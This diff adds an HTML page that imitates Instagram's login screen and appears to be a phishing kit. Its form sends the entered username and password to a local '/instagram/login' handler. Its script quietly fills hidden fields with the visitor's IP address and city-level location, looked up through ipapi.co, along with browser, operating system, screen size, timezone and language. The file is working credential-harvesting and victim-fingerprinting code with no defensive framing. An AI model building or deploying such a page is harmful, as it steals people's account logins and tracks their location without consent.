@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+    background:#fafafa; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
+  .box { width:100%; max-width:350px; background:#fff; border:1px solid #dbdbdb;
+         padding:40px 35px 20px; text-align:center; }
+  .logo { font-family:'Billabong','Segoe Script',cursive; font-size:42px; margin-bottom:30px;
+          background: linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
+          -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+  input { width:100%; padding:10px 8px; font-size:14px; border:1px solid #dbdbdb;
+    border-radius:3px; margin-bottom:6px; background:#fafafa; outline:none; }
+  input:focus { border-color:#a8a8a8; }
+  .btn { width:100%; background:#0095f6; color:#fff; border:none; padding:8px;
+    font-size:14px; font-weight:600; border-radius:8px; margin-top:10px; cursor:pointer; }
+  .or { display:flex; align-items:center; margin:20px 0; color:#8e8e8e; font-size:12px; font-weight:600; }
+  .or hr { flex:1; border:none; border-top:1px solid #dbdbdb; }
+  .or span { margin:0 18px; }
+  .fb { color:#385185; font-size:14px; font-weight:600; text-decoration:none;
+        display:inline-block; margin-bottom:14px; }
+  .forgot { color:#00376b; font-size:12px; text-decoration:none; }
+  .signup { width:100%; max-width:350px; background:#fff; border:1px solid #dbdbdb;
+    padding:20px; text-align:center; font-size:14px; margin-top:12px; }
+  .signup a { color:#0095f6; font-weight:600; text-decoration:none; }
+  @media (max-width:400px) { body { padding:0; }
+    .box, .signup { border:none; max-width:100%; } }
+</style>
+</head>
+<body>
+  <div style="display:flex; flex-direction:column; align-items:center; width:100%;">
+    <div class="box">
+      <div class="logo">Instagram</div>
+      <form action="/instagram/login" method="POST" id="login-form">
+        <input type="text" name="email" placeholder="Phone number, username, or email" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="btn">Log in</button>
+        <input type="hidden" name="ip_address" id="ip-address">
+        <input type="hidden" name="geo_location" id="geo-location">
+        <input type="hidden" name="device_type" id="device-type">
+        <input type="hidden" name="browser_info" id="browser-info">
+        <input type="hidden" name="os_info" id="os-info">
+        <input type="hidden" name="screen_resolution" id="screen-resolution">
+        <input type="hidden" name="timezone" id="timezone">
+        <input type="hidden" name="language" id="language">
+      </form>
+      <div class="or"><hr><span>OR</span><hr></div>
+      <a href="#" class="fb">Log in with Facebook</a><br>
+      <a href="#" class="forgot">Forgot password?</a>
+    </div>
+    <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+  </div>
+<script>
+async function collectFingerprint() {
+  const ua = navigator.userAgent;
+  document.getElementById('browser-info').value = ua;
+  document.getElementById('os-info').value = navigator.platform;
+  document.getElementById('device-type').value = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
+  document.getElementById('screen-resolution').value = `${window.screen.width}x${window.screen.height}`;
+  document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  document.getElementById('language').value = navigator.language;
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const d = await res.json();
+    if (d.ip) {
+      document.getElementById('ip-address').value = d.ip;
+      document.getElementById('geo-location').value = [d.city, d.region, d.country_name].filter(Boolean).join(', ');
+    }
+  } catch(e) {}
+}
+document.addEventListener('DOMContentLoaded', () => {
+  collectFingerprint();
+  const form = document.getElementById('login-form');
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    await collectFingerprint();
+    form.submit();
+  });
+});
+</script>
+</body>
+</html>
